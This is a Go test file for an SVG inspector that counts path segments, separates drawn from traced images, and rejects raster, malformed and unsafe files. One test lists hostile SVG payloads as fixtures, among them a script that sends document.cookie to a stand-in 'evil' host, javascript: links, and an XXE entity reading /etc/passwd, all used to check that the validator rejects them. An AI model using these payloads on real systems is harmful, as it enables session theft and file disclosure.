package recraft

import (
	"errors"
	"math"
	"strings"
	"testing"
)

func svgDoc(inner string) []byte {
	return []byte(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">` + inner + `</svg>`)
}

// TestInspectSVG_CountsImplicitRepetition is the reason this measurement is not three lines of
// letter-counting.
//
// The SVG grammar lets one command letter be followed by many coordinate groups, and a TRACED
// raster — the thing requirement P-3 forbids — leans on that heavily: thousands of tiny line
// segments under a handful of letters. Counting letters would report such a file as tidy, which is
// precisely backwards.
func TestInspectSVG_CountsImplicitRepetition(t *testing.T) {
	cases := []struct {
		name                            string
		d                               string
		nodes, lines, cubs, quads, arcs int
	}{
		{"a move and two implicit linetos", "M0 0 10 10 20 20", 3, 2, 0, 0, 0},
		{"explicit commands", "M0 0 L10 10 L20 20 Z", 3, 2, 0, 0, 0},
		{"two cubics under one C", "M0 0C1 1 2 2 3 3 4 4 5 5 6 6", 3, 0, 2, 0, 0},
		{"smooth cubic counts as cubic", "M0 0 S1 1 2 2", 2, 0, 1, 0, 0},
		{"quadratics", "M0 0 Q1 1 2 2 T3 3", 3, 0, 0, 2, 0},
		{"arcs", "M0 0 A5 5 0 0 1 10 10", 2, 0, 0, 0, 1},
		{"horizontal and vertical are lines", "M0 0 H10 V10 h-5", 4, 3, 0, 0, 0},
		{"packed signs and decimals", "M0,0l-1-2 1.5.5", 3, 2, 0, 0, 0},
		{"exponents are one number, not two", "M0 0 L1e2 1E-2", 2, 1, 0, 0, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			stats, err := InspectSVG(svgDoc(`<path d="` + tc.d + `"/>`))
			if err != nil {
				t.Fatalf("InspectSVG: %v", err)
			}
			if stats.Nodes != tc.nodes || stats.LineSegments != tc.lines ||
				stats.CubicSegments != tc.cubs || stats.QuadSegments != tc.quads || stats.ArcSegments != tc.arcs {
				t.Errorf("d=%q gave nodes=%d lines=%d cubic=%d quad=%d arc=%d, want %d/%d/%d/%d/%d",
					tc.d, stats.Nodes, stats.LineSegments, stats.CubicSegments, stats.QuadSegments, stats.ArcSegments,
					tc.nodes, tc.lines, tc.cubs, tc.quads, tc.arcs)
			}
		})
	}
}

// TestInspectSVG_SeparatesDrawnFromTraced is the requirement expressed as a number a human can read
// on the screen: a redraw is mostly curves, a trace is a pile of straight segments.
func TestInspectSVG_SeparatesDrawnFromTraced(t *testing.T) {
	drawn, err := InspectSVG(svgDoc(`<path d="M0 0 C1 1 2 2 3 3 4 4 5 5 6 6 C7 7 8 8 9 9 L10 10"/>`))
	if err != nil {
		t.Fatalf("InspectSVG: %v", err)
	}
	if !drawn.HasCurves() || drawn.CurveShare() < 0.5 {
		t.Errorf("a drawn path should read as mostly curved, got %+v (share %.2f)", drawn, drawn.CurveShare())
	}

	// What a tracer emits: one move, then hundreds of implicit line segments.
	var b strings.Builder
	b.WriteString("M0 0")
	for i := 0; i < 500; i++ {
		b.WriteString(" 1 1")
	}
	traced, err := InspectSVG(svgDoc(`<path d="` + b.String() + `"/>`))
	if err != nil {
		t.Fatalf("InspectSVG: %v", err)
	}
	if traced.HasCurves() {
		t.Error("a traced outline has no curvature at all")
	}
	if traced.LineSegments != 500 || traced.Nodes != 501 {
		t.Errorf("traced counts = %d segments / %d nodes, want 500/501", traced.LineSegments, traced.Nodes)
	}
	if traced.CurveShare() != 0 {
		t.Errorf("curve share = %v, want 0", traced.CurveShare())
	}
}

func TestInspectSVG_CountsShapesTextAndExternalRefs(t *testing.T) {
	stats, err := InspectSVG(svgDoc(
		`<rect width="10" height="10"/>` +
			`<circle r="4"/>` +
			`<polyline points="0,0 1,1 2,2"/>` +
			`<polygon points="0,0 1,1 2,2 3,3"/>` +
			`<text x="1" y="2">CB 12</text>` +
			`<image href="https://example.com/photo.png"/>`))
	if err != nil {
		t.Fatalf("InspectSVG: %v", err)
	}
	if stats.Shapes != 4 {
		t.Errorf("shapes = %d, want 4", stats.Shapes)
	}
	if stats.PolylinePoints != 7 || stats.Nodes != 7 {
		t.Errorf("polyline points = %d, nodes = %d, want 7/7", stats.PolylinePoints, stats.Nodes)
	}
	if stats.TextNodes != 1 {
		t.Errorf("text nodes = %d, want 1 (our stroke editor holds no text)", stats.TextNodes)
	}
	// An external reference is legal and is NOT refused — but a picture that silently depends on
	// somebody else's server will one day render empty, so it is counted where a human can see it.
	if stats.ExternalRefs != 1 {
		t.Errorf("external refs = %d, want 1", stats.ExternalRefs)
	}
	if stats.ViewBox != "0 0 100 100" {
		t.Errorf("viewBox = %q", stats.ViewBox)
	}
}

func TestInspectSVG_RejectsNonVectorAndBrokenBytes(t *testing.T) {
	png := append([]byte("\x89PNG\r\n\x1a\n"), make([]byte, 16)...)
	jpeg := append([]byte{0xFF, 0xD8, 0xFF, 0xE0}, make([]byte, 16)...)
	gif := []byte("GIF89a" + strings.Repeat("\x00", 16))
	webp := []byte("RIFF\x00\x00\x00\x00WEBPVP8 ")
	pdf := []byte("%PDF-1.7\n%…")

	cases := []struct {
		name string
		raw  []byte
		want error
	}{
		{"a PNG", png, ErrNotVector},
		{"a JPEG", jpeg, ErrNotVector},
		{"a GIF", gif, ErrNotVector},
		{"a WEBP", webp, ErrNotVector},
		{"a PDF", pdf, ErrNotVector},
		{"empty", nil, ErrInvalidResponse},
		{"prose", []byte("I could not draw that."), ErrInvalidResponse},
		{"html", []byte("<html><body>502</body></html>"), ErrInvalidResponse},
		{"truncated", []byte(`<svg><path d="M0 0"`), ErrInvalidResponse},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := InspectSVG(tc.raw)
			if !errors.Is(err, tc.want) {
				t.Fatalf("err = %v, want %v", err, tc.want)
			}
		})
	}

	// Over the cap. These bytes travel whole through a process with 0.5 GiB of RAM.
	huge := append([]byte(`<svg xmlns="http://www.w3.org/2000/svg">`), make([]byte, MaxSVGBytes)...)
	if _, err := InspectSVG(huge); !errors.Is(err, ErrInvalidResponse) {
		t.Fatalf("oversized err = %v, want ErrInvalidResponse", err)
	}
}

// TestInspectSVG_RejectsActiveContent guards the browser these bytes end up in. They are served from
// our own bucket into an admin session, so active content is refused outright rather than scrubbed:
// a partial scrub that misses one vector is worse than a loud refusal of a file no legitimate
// generation produces.
func TestInspectSVG_RejectsActiveContent(t *testing.T) {
	cases := map[string]string{
		"a script element":   `<script>fetch("https://evil/"+document.cookie)</script>`,
		"an event handler":   `<rect width="10" height="10" onload="alert(1)"/>`,
		"a javascript link":  `<a href="javascript:alert(1)"><rect width="1" height="1"/></a>`,
		"an obfuscated link": `<a href="java&#9;script:alert(1)"><rect width="1" height="1"/></a>`,
		"embedded html":      `<foreignObject><div>hi</div></foreignObject>`,
		"an html data url":   `<image href="data:text/html;base64,PHNjcmlwdD4="/>`,
	}
	for name, inner := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := InspectSVG(svgDoc(inner)); !errors.Is(err, ErrUnsafeSVG) {
				t.Fatalf("err = %v, want ErrUnsafeSVG", err)
			}
		})
	}

	// An entity declaration is how an SVG becomes a decompression bomb or an XXE probe.
	doc := `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
		`<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`
	if _, err := InspectSVG([]byte(doc)); !errors.Is(err, ErrUnsafeSVG) {
		t.Fatalf("entity declaration err = %v, want ErrUnsafeSVG", err)
	}
}

func TestInspectSVG_AcceptsOrdinaryProviderOutput(t *testing.T) {
	// A plain XML prolog, a DOCTYPE without entities, named entities in text, and a group wrapper —
	// all of it ordinary, none of it a reason to refuse a paid picture.
	doc := `<?xml version="1.0" encoding="UTF-8" standalone="no"?>` +
		`<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">` +
		`<svg xmlns="http://www.w3.org/2000/svg" width="1024" height="1024" viewBox="0 0 1024 1024">` +
		`<g fill="none" stroke="#111"><path d="M12 12 C 30 40 60 40 78 12"/><text>caf&eacute;</text></g></svg>`
	stats, err := InspectSVG([]byte(doc))
	if err != nil {
		t.Fatalf("InspectSVG: %v", err)
	}
	if stats.Paths != 1 || stats.CubicSegments != 1 {
		t.Errorf("stats = %+v, want one path with one cubic", stats)
	}
	if stats.Width != "1024" || stats.Height != "1024" {
		t.Errorf("root geometry = %q x %q", stats.Width, stats.Height)
	}
	if math.Abs(stats.CurveShare()-1) > 1e-9 {
		t.Errorf("curve share = %v, want 1 for an all-curve drawing", stats.CurveShare())
	}
}
